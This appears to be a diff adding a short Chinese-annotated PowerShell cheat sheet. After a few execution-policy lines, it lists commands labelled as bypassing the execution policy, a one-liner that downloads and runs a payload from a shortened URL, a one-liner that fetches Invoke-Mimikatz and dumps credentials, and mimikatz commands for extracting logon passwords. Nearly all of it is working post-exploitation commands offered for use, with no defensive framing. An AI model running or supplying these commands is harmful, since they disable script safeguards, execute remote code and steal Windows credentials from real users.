@@ -1,0 +1,21 @@
+Get-ExecutionPolicy		查看当前策略
+
+Get-ExecutionPolicy -List | Format-Table -AutoSize	查看所有可选策略
+
+set-executionpolicy remotesigned			设置策略
+
+Get-Content .runme.ps1 | PowerShell.exe -noprofile -	绕过防护策略
+
+Get-Content .runme.ps1 | Invoke-Expression		绕过防护策略
+
+GC .runme.ps1 | iex					绕过防护策略
+
+PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1	绕过防护策略
+
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"	从网上读取payload
+
+powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"		在线调用mimikatz
+
+mimikatz使用： 1 . privilege::debug 2 . sekurlsa::logonpasswords
+
+
